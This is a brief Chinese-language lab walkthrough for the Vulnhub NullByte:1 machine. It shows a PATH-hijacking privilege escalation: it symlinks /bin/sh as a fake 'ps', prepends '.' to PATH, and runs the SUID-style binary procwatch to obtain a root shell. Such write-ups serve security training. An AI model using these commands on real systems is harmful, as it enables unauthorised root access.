# 命令劫持提权

[Vulnhub-靶机-NULLBYTE: 1 - 皇帽讲绿帽带法技巧 - 博客园 (cnblogs.com)](https://www.cnblogs.com/autopwn/p/13613955.html)

看到有个backup文件夹，过去看看

<img src=".\图片\700440-20200904145949019-714744502.png" alt="img"  />

 

看见文件procwatch且是二进制文件，而且每个用户都有执行权限，执行一下看看

<img src=".\图片\700440-20200904150114604-2110976323.png" alt="img"  />

 

发现像是使用shell脚本的形式执行了ps命令，这里如果懂二进制的话，大可以直接去调试二进制文件看看，可以参考：https://www.nuharborsecurity.com/nullbyte-1-walkthrough/

知道上面的结果那么我们可以劫持ps命令提权了

可以使用下面方法提权

```
cd /var/www/backup
ln -s /bin/sh ps
export PATH=.:$PATH
./procwatch
```

也可以生成一个ps文件，然后里面写/bin/sh就可以，给这个文件所有权限然后执行二进制即可提权

最终得到目标靶机的proof.txt

<img src=".\图片\700440-20200904150456751-663004609.png" alt="img" style="zoom:80%;" />